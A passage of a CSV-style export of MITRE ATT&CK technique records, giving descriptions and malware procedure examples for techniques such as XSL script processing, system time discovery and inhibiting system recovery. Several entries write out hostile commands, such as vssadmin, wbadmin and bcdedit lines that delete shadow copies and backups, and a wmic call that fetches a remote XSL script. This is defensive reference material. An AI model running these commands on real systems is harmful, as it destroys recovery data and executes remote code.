and receive files.', '[Kinsing] has downloaded additional lateral movement scripts from C2.', '[BONDUPDATER] can download or upload files from its C2 server.', '[ZIRCONIUM] has used tools to download malicious files to compromised hosts.', '[Metamorfo] has used MSI files to download additional files to execute. ', '[CharmPower] has the ability to download additional modules to a compromised host.', '[GALLIUM] dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and [HTRAN]', '[OutSteel] can download files from its C2 server.', '[MacMa] has downloaded additional files, including an exploit for used privilege escalation.', '[ZIPLINE] can download files to be saved on the compromised system.', '[RemoteUtilities] can upload and download files to and from a target machine.', '[Chaes] can download additional files onto an infected machine.', '[Metador] has downloaded tools and malware onto a compromised system.', '[CORESHELL] downloads another dropper from its C2 server.', '[FELIXROOT] downloads and uploads files to and from the victim’s machine.', 'During [C0018] the threat actors downloaded additional tools, such as [Mimikatz] and [Sliver] as well as [Cobalt Strike] and [AvosLocker] ransomware onto the victim network.', '[SUNBURST] delivered different payloads, including [TEARDROP] in at least one instance.', '[Felismus] can download files from remote servers.', '[ThiefQuest] can download and execute payloads in-memory or from disk.', '[Sandworm Team] has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.', '[UBoatRAT] can upload and download files to the victim’s machine.', 'Operators deploying [Netwalker] have used psexec and certutil to retrieve the [Netwalker] payload.', '[Ecipekac] can download additional payloads to a compromised host.', '[RGDoor] uploads and downloads files to and from the victim’s machine.', 'During [Night Dragon] threat actors used administrative utilities to deliver Trojan components to remote systems.', '[Mustard Tempest] has deployed secondary payloads and third stage implants to compromised hosts.', 'During [Operation Wocao] threat actors downloaded additional files to the infected system.', '[Dtrack] can download and upload a file to the victim’s computer.', '[Andariel] has downloaded additional tools and malware onto compromised hosts.', '[STEADYPULSE] can add lines to a Perl script on a targeted server to import additional Perl modules.', '[Ajax Security Team] has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.', '[Empire] can upload and download to and from a victim machine.', '[SharpDisco] has been used to download a Python interpreter to `C:\\Users\\Public\\WinTN\\WinTN.exe` as well as other plugins from external sources.', '[WhisperGate] can download additional stages of malware from a Discord CDN channel.', 'The Ritsol backdoor trojan used by [Elderwood] can download files onto a compromised host from a remote location.', '[StrifeWater] can download updates and auxiliary modules.', '[Cannon] can download a payload for execution.', '[JHUHUGIT] can retrieve an additional payload from its C2 server. [JHUHUGIT] has a command to download files to the victim’s machine.', '[Drovorub] can download files to a compromised host.', '[RedLeaves] is capable of downloading a file from a specified URL.', '[JSS Loader] has the ability to download malicious executables to a compromised host.', '[NETWIRE] can downloaded payloads from C2 to the compromised host.', '[APT3] has a tool that can copy files to remote machines.', '[ShadowPad] has downloaded code from a C2 server.', ""[Lokibot] downloaded several staged items onto the victim's machine. "", '[P.A.S. Webshell] can upload and download files to and from compromised hosts.', '[Chimera] has remotely copied tools and malware onto targeted systems.', '[Conficker] downloads an HTTP server to the infected machine.', '[Hikit] has the ability to download files to a compromised host.', '[Tonto Team] has downloaded malicious DLLs which served as a [ShadowPad] loader.', 'During [C0017] [APT41] downloaded malicious payloads onto compromised systems.', '[Agent.btz] attempts to download an encrypted binary from a specified domain.', '[PLAINTEE] has downloaded and executed additional plugins.', '[VBShower] has the ability to download VBS files to the target computer.', '[Javali] can download payloads from remote C2 servers.', '[IndigoZebra] has downloaded additional files and tools from its C2 server.', '[ZxShell] has a command to transfer files from a remote host. ', '[UNC2452] downloaded additional tools, such as [TEARDROP] malware and [Cobalt Strike] to the compromised host following initial compromise.', '[Frankenstein] has uploaded and downloaded files to utilize additional plugins.', '[Sharpshooter] downloaded additional payloads after a target was infected with a first-stage downloader.', '[Operation Wocao] can download additional files to the infected system.', '[Dragonfly 2.0] copied and installed tools for operations once in the victim environment.', '[Valak] has downloaded a variety of modules and payloads to the compromised host, including IcedID and [Ursnif]', '[XTunnel] is capable of downloading additional files.', '[HAWKBALL] has downloaded additional files from the C2.', '[Exaramel] has a command to download a file from a remote server to execute.', 'creates a backdoor through which remote attackers can upload files.', 'Dragonfly downloaded tools from a remote server after they were inside the victim network.', 'APT34 can download remote files onto victims.']",False
T1126,Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [Windows Admin Shares] connections can be removed when no longer needed. [Net] is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command.   ,[],True
T1648,Serverless Execution,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers.   Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking] Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles] to a serverless cloud function, which may then be able to perform actions the original user cannot.  Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution] potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials] to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.",['[Pacu] can create malicious Lambda functions.'],False
T1084,Windows Management Instrumentation Event Subscription,"Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension).  Examples of events that may be subscribed to are the wall clock time or the computer's uptime.  Several threat groups have reportedly used this technique to maintain persistence. ",[],True
T1160,Launch Daemon,"Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> . These LaunchDaemons have property list files which point to the executables that will be launched .   Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories . The daemon name may be disguised by using a name from a related operating system or benign software  . Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.   The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",[],True
T1653,Power Settings,"Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.  Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.  For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. Adversaries may also extend system lock screen timeout settings. Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.  Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.",[],False
T1665,Hide Infrastructure,"Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.  C2 networks may include the use of [Proxy] or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.  Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents. Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion]  Hiding C2 infrastructure may also be supported by [Resource Development] activities such as [Acquire Infrastructure] and [Compromise Infrastructure] For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.","['During the [SolarWinds Compromise] [APT29] set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.', '[DarkGate] command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services.', '[APT29] uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.']",False
T1484,Domain or Tenant Policy Modification,"Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.  Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.  With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:    * modifying GPOs to push a malicious [Scheduled Task] to computers throughout the domain environment * modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources * changing configuration settings within the AD environment to implement a [Rogue Domain Controller] * adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant   Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",[],False
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.   Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution] the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.  Command-line examples:  * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>  Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation] to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its [Regsvr32] ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation] provided they utilize the /FORMAT switch.  Command-line examples:  * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code> * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>","['[Astaroth] executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. ', '[Cobalt Group] used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.', '[Higaisa] used an XSL file to run VBScript code.', 'During [Operation Dream Job] [Lazarus Group] used a remote XSL script to download a Base64-encoded DLL custom downloader.', '[Lazarus Group] has used WMIC to execute a remote XSL script to establish persistence. ']",False
T1587,Develop Capabilities,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.  As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",['[Kimsuky] created and used a mailing toolkit to use in spearphishing attacks.'],
T1173,Dynamic Data Exchange,"Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.  Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.     Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.",[],True
T1008,Fallback Channels,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,"['[JHUHUGIT] tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.', '[Linfo] creates a backdoor through which remote attackers can change C2 servers.', '[CHOPSTICK] can switch to a new C2 channel if the current one is broken.', '[OilRig] malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.', '[HOPLIGHT] has multiple C2 channels in place in case one fails.\t', '[InvisiMole] has been configured with several servers available for alternate C2 communications.', '[SslMM] has a hard-coded primary and backup C2 string.', ""[Ebury] has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days."", '[BISCUIT] malware contains a secondary fallback command and control server that is contacted after the primary command and control server.', '[TrickBot] can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.', '[Valak] can communicate over multiple C2 hosts.', '[S-Type] primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.', '[FatDuke] has used several C2 servers per targeted organization.', '[QUIETEXIT] can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.', '[Shark] can update its configuration to use a different C2 server.', '[MiniDuke] uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.', '[WinMM] is usually configured with primary and backup domains for C2 communications.', '[Bumblebee] can use backup C2 servers if the primary server fails.', '[Exaramel for Linux] can attempt to find a new C2 server if it receives an error.', '[RainyDay] has the ability to switch between TCP and HTTP for C2 if one method is not working.', '[Stuxnet] has the ability to generate new C2 domains.', '[CharmPower] can change its C2 channel once every 360 loops by retrieving a new domain from the actors’ S3 bucket.', '[Kazuar] can accept multiple URLs for C2 servers.', '[APT41] used the Steam community page as a fallback mechanism for C2. ', '[AppleSeed] can use a second channel for C2 when the primary channel is in upload mode.', 'During [Night Dragon] threat actors used company extranet servers as secondary C2 servers.', '[Gelsemium] can use multiple domains and protocols in C2.', '[ShimRat] has used a secondary C2 location if the first was unavailable.\t', '[Mis-Type] first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.', '[Uroburos] can use up to 10 channels to communicate between implants.', '[NETEAGLE] will attempt to detect if the infected host is configured to a proxy. If so, [NETEAGLE] will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.', '[Lazarus Group] malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.', '[SideTwist] has primarily used port 443 for C2 but can use port 80 as a fallback.', '[DustySky] has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.', '[TinyTurla] can go through a list of C2 server IPs and will try to register with each until one responds.', '[Kevin] can assign hard-coded fallback domains for C2.', '[Derusbi] uses a backup communication method with an HTTP beacon.', '[Machete] has sent data over HTTP if FTP failed, and has also used a fallback server. ', '[Bazar] has the ability to use an alternative C2 server if the primary server fails.', '[Crutch] has used a hardcoded GitHub repository as a fallback channel.', '[TAINTEDSCRIBE] can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.', '[Cardinal RAT] can communicate over multiple C2 host and port combinations.', '[RDAT] has used HTTP if DNS C2 communications were not functioning.\t', '[QUADAGENT] uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.', '[FIN7] Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.', '[Kwampirs] uses a large list of C2 servers that it cycles through until a successful connection is established.', 'The C2 server used by [XTunnel] provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.', '[PipeMon] can switch to an alternate C2 domain when a particular date has been reached.', '[Mythic] can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.\t', '[BlackEnergy] has the capability to communicate over a backup channel via plus.google.com.', '[Anchor] can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.', '[Carbanak] Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails. ']",
T1096,NTFS File Attributes,"Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).      Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  ",[],True
T1124,System Time Discovery,"An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.  System time information may be gathered in a number of ways, such as with [Net] on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.  On network devices, [Network Device CLI] commands such as `show clock detail` can be used to see the current time configuration.  In addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.  This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job] or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery] Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.","['[Shamoon] obtains the system time and will only activate if it is greater than a preset date.', '[Astaroth] collects the timestamp from the infected machine. ', '[Zebrocy] gathers the current time zone and date information from the system.', '[ShadowPad] has collected the current date and time of the victim system.', '[Taidoor] can use <code>GetLocalTime</code> and <code>GetSystemTime</code> to collect system time.', '[EvilBunny] has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.', '[T9000] gathers and beacons the system time during installation.', '[KEYPLUG] can obtain the current tick count of an infected computer.', '[Sidewinder] has used tools to obtain the current system time.', 'The <code>net time</code> command can be used in [Net] to determine the local or remote system time.', '[SombRAT] can execute <code>getinfo</code>  to discover the current time on a compromised host.', '[Epic] uses the <code>net time</code> command  to get the system time from the machine and collect the current date and time zone information.', '[Torisma] can collect the current time on a victim machine.', 'During [Operation CuckooBees] the threat actors used the `net time` command as part of their advanced reconnaissance.', '[UPPERCUT] has the capability to obtain the time zone information and current timestamp of the victim’s machine.', '[GoldMax] can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server. ', '[Conficker] uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.', 'During [Operation Wocao] threat actors used the `time` command to retrieve the current time of a compromised system.', '[GravityRAT] can obtain the date and time of a system.', '[Agent Tesla] can collect the timestamp from the victim’s machine.', '[ccf32] can determine the local time on targeted machines.', '[BADHATCH] can obtain the `DATETIME` and `UPTIME` from a compromised machine.  ', '[GRIFFON] has used a reconnaissance module that can be used to retrieve the date and time of the system.\t', '[QakBot] can identify the system time on a targeted host.', '[Carbon] uses the command <code>net time \\\\127.0.0.1</code> to get information the system’s time.', '[Higaisa] used a function to gather the current time.', '[Egregor] contains functionality to query the local/system time.', '[Crimson] has the ability to determine the date and time on a compromised host.', '[Metamorfo] uses JavaScript to get the system time. ', '[RTM] can obtain the victim time zone.', ""[NOKKI] can collect the current timestamp of the victim's machine."", '[Grandoreiro] can determine the time on the victim machine via IPinfo.', '[DarkWatchman] can collect time zone information and system `UPTIME`.', '[DRATzarus] can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to inspect system time.', '[StoneDrill] can obtain the current date and time of the victim machine.\t', '[SUNBURST] collected device `UPTIME`.', '[build_downer] has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.', '[ZIRCONIUM] has used a tool to capture the time on a compromised host in order to register it with C2.', '[TajMahal] has the ability to determine local time on a compromised host.', '[DCSrv] can compare the current time on an infected host with a configuration value to determine when to start the encryption process.', '[SILENTTRINITY] can collect start time information from a compromised host.', '[PowerDuke] has commands to get the time the machine was built, the time, and the time zone.', '[BRONZE BUTLER] has used <code>net time</code> to check the local time on a target system.', '[Bazar] can collect the time on the compromised host.', ""[MoonWind] obtains the victim's current time."", '[BISCUIT] has a command to collect the system `UPTIME`.', '[FunnyDream] can check system time to help determine when changes were made to specified files.', '[Turla] surveys a system upon check-in to discover the system time by using the <code>net time</code> command.', '[FELIXROOT] gathers the time zone information from the victim’s machine.', ""[StrifeWater] can collect the time zone from the victim's machine."", '[Darkhotel] malware can obtain system time from a compromised host.', '[SVCReady] can collect time zone information.', '[Zeus Panda] collects the current system time (UTC) and sends it back to the C2 server.', '[PipeMon] can send time zone information from a compromised host to C2.', '[Chimera] has used <code>time /t</code> and <code>net time \\\\ip/hostname</code> for system time discovery.', '[Azorult] can collect the time zone information from the system.', '[Cannon] can collect the current time zone information from the victim’s machine.', ""[DarkGate] creates a log file for capturing keylogging, clipboard, and related data using the victim host's current date for the filename. [DarkGate] queries victim system epoch time during execution. [DarkGate] captures system time information as part of automated profiling on initial installation."", '[Clambling] can determine the current time.', '[TAINTEDSCRIBE] can execute <code>GetLocalTime</code> for time discovery.', 'During [C0015] the threat actors used the command `net view /all time` to gather the local time of a compromised network.', ""[ComRAT] has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday). "", '[BendyBear] has the ability to determine local time on a compromised host. ', '[Stuxnet] collects the time and date of a system when it is infected.', 'A Destover-like implant used by [Lazarus Group] can obtain the current system time and send it to the C2 server.', '[HOPLIGHT] has been observed collecting system time from victim machines.', '[BLUELIGHT] can collect the local time on a compromised host.', 'As part of the data reconnaissance phase, [Proxysvc] grabs the system time to send back to the control server.', '[OopsIE] checks to see if the system is configured with ""Daylight"" time and checks for a specific region to be set for the timezone.', '[InvisiMole] gathers the local system time from the victim’s machine.', '[SHARPSTATS] has the ability to identify the current date and time on the compromised host.', '[Green Lambert] can collect the date and time from a compromised host.', '[Okrum] can obtain the date and time of the compromised system.', '[Bisonal] can check the system time set on the infected host.', ""[AppleSeed] can pull a timestamp from the victim's machine."", '[AvosLocker] has checked the system time before and after encryption.', '[The White Company] has checked the current date on the victim system.', '[WindTail] has the ability to generate the current date and time.', '[Operation Wocao] has used the <code>time</code> command to retrieve the current time of a compromised system.']",False
T1035,Service Execution,"Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service] and [Modify Existing Service] during service persistence or privilege escalation.",[],True
T1086,PowerShell,"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.   PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  Administrator permissions are required to use PowerShell to connect to remote systems.  A number of PowerShell-based offensive testing tools are available, including [Empire]  PowerSploit,  and PSAttack.   PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI).  ","['Dragonfly has used PowerShell.', 'APT34 has used PowerShell scripts for execution.']",True
T1556,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts]  Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","['[Ebury] can intercept private keys using a trojanized <code>ssh-add</code> function.', '[SILENTTRINITY] can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.', '[Kessel] has trojanized the <sode>ssh_login</code> and <code>user-auth_pubkey</code> functions to steal plaintext credentials.', '[FIN13] has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.  ']",False
T1495,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.  In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable. Depending on the device, this attack may also result in [Data Destruction] ","['[Bad Rabbit] has used an executable that installs a modified bootloader to prevent normal boot-up.', '[TrickBot] module ""Trickboot"" can write or erase the UEFI/BIOS firmware of a compromised device.']",False
T1490,Inhibit System Recovery,"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.  Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction] and [Data Encrypted for Impact] Furthermore, adversaries may disable recovery notifications, then corrupt backups.  A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:  * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation] can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code> * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system * <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>    On network devices, adversaries may leverage [Disk Wipe] to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot] to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.  Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.","['[Black Basta] can delete shadow copies using vssadmin.exe.', '[Ragnar Locker] can delete volume shadow copies using <code>vssadmin delete shadows /all /quiet</code>.', '[InvisiMole] can can remove all system restore points.', '[WastedLocker] can delete shadow volumes. ', '[H1N1] disable recovery options and deletes shadow copies from the victim.', '[RobbinHood] deletes shadow copies to ensure that all the data cannot be restored easily. ', '[Ryuk] has used <code>vssadmin Delete Shadows /all /quiet</code> to to delete volume shadow copies and <code>vssadmin resize shadowstorage</code> to force deletion of shadow copies created by third-party applications.', '[DarkWatchman] can delete shadow volumes using <code>vssadmin.exe</code>.', '[EKANS] removes backups of Volume Shadow Copies to disable any restoration capabilities.', '[MegaCortex] has deleted volume shadow copies using <code>vssadmin.exe</code>.', '[DEATHRANSOM] can delete volume shadow copies on compromised hosts.', '[Royal] can delete shadow copy backups with vssadmin.exe using the command `delete shadows /all /quiet`.', '[Avaddon] deletes backups and shadow copies using native system tools.', '[Prestige] can delete the backup catalog from the target system using: `c:\\Windows\\System32\\wbadmin.exe delete catalog -quiet` and can also delete volume shadow copies using: `\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet`. ', '[DarkGate] can delete system restore points through the command <code>cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”</code>.', '[HermeticWiper] can disable the VSS service on a compromised host using the service control manager.', '[WannaCry] uses <code>vssadmin</code>, <code>wbadmin</code>, <code>bcdedit</code>, and <code>wmic</code> to delete and disable operating system recovery features.', '[Wizard Spider] has used WMIC and vssadmin to manually delete volume shadow copies. [Wizard Spider] has also used [Conti] ransomware to delete volume shadow copies automatically with the use of vssadmin. ', '[Babuk] has the ability to delete shadow volumes using <code>vssadmin.exe delete shadows /all /quiet</code>.', '[BitPaymer] attempts to remove the backup shadow files from the host using <code>vssadmin.exe Delete Shadows /All /Quiet</code>.', '[HELLOKITTY] can delete volume shadow copies on compromised hosts.', ""[Netwalker] can delete the infected system's Shadow Volumes to prevent recovery."", '[FIVEHANDS] has the ability to delete volume shadow copies on compromised hosts.', '[Conti] can delete Windows Volume Shadow Copies using <code>vssadmin</code>.', '[Akira] will delete system volume shadow copies via PowerShell commands.', '[Clop] can delete the shadow volumes with <code>vssadmin Delete Shadows /all /quiet</code> and can use bcdedit to disable recovery options.', '[Meteor] can use `bcdedit` to delete different boot identifiers on a compromised host; it can also use `vssadmin.exe delete shadows /all /quiet` and 